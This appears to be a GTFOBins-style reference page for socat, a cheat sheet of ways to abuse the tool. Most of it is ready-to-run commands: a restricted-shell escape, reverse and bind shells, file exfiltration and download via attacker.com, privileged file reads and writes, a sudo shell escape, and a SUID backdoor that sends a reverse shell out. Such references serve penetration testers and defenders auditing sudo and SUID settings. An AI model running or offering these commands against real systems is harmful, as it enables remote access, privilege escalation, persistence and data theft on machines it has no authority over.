# GTFOBin: socat

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

The resulting shell is not a proper TTY shell and lacks the prompt.

```
socat stdin exec:/bin/sh
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.

```
RHOST=attacker.com
RPORT=12345
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Bind shell

It can bind a shell to a local port to allow remote network access.

Run `socat FILE:`tty`,raw,echo=0 TCP:target.com:12345` on the attacker box to connect to the shell.

```
LPORT=12345
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## File upload

It can exfiltrate files on the network.

Run `socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat` on the attacker box to collect the file.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
socat -u file:$LFILE tcp-connect:$RHOST:$RPORT
```

## File download

It can download remote files.

Run `socat -u file:file_to_send tcp-listen:12345,reuseaddr` on the attacker box to send the file.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
socat -u 'exec:echo DATA' "open:$LFILE,creat"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
socat -u "file:$LFILE" -
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

The resulting shell is not a proper TTY shell and lacks the prompt.

```
sudo socat stdin exec:/bin/sh
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.

```
sudo install -m =xs $(which socat) .

RHOST=attacker.com
RPORT=12345
./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```